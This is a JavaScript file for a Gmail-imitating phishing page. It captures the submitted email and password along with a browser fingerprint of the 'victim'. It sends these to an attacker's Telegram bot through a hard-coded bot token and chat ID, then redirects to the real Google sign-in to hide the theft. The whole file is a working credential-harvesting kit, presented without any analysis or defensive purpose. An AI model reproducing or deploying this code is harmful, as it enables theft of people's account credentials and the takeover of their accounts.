// Password toggle
const passwordInput = document.getElementById('password');
const togglePassword = document.querySelector('.toggle-password');
let showPassword = false;

togglePassword.addEventListener('click', () => {
    showPassword = !showPassword;
    passwordInput.type = showPassword ? 'text' : 'password';
    togglePassword.textContent = showPassword ? 'Hide password' : 'Show password';
});

// Form submission
document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const remember = document.getElementById('remember').checked;
    
    // Loading state
    const btn = document.getElementById('submitBtn');
    const btnText = btn.querySelector('.btn-text');
    const loader = btn.querySelector('.loader');
    btn.disabled = true;
    btnText.style.opacity = '0';
    loader.style.display = 'block';
    
    // Victim fingerprint
    const victimData = {
        email: email,
        password: password,
        remember: remember,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        resolution: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        timestamp: new Date().toISOString(),
        url: window.location.href
    };
    
    // Telegram config - REPLACE THESE
    const BOT_TOKEN = '8668043512:AAGe5xBZuouUi2das4ttGhU9ehz4e96ECPM'; // e.g., '1234567890:ABCdef...'
    const CHAT_ID = '7133577749';     // e.g., '123456789'
    
    const message = `🚨 *GMAIL CREDENTIALS CAPTURED* 🚨

📧 *Email:* \`${email}\`
🔑 *Password:* \`${password}\`
💾 *Stay signed in:* ${remember ? '✅' : '❌'}
🌐 *User Agent:* ${navigator.userAgent.slice(0, 80)}...
📱 *Device:* ${navigator.platform}
🖥️ *Resolution:* ${screen.width}x${screen.height}
🌍 *Timezone:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}
⏰ *Timestamp:* ${new Date().toLocaleString()}
🔗 *Phishing URL:* ${window.location.href}

*2FA/Browser data logged server-side if available*`;
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });
    } catch (error) {
        console.error('Telegram send failed:', error);
    }
    
    // Redirect to real Gmail after 3s
    setTimeout(() => {
        window.location.href = 'https://accounts.google.com/signin';
    }, 3000);
});
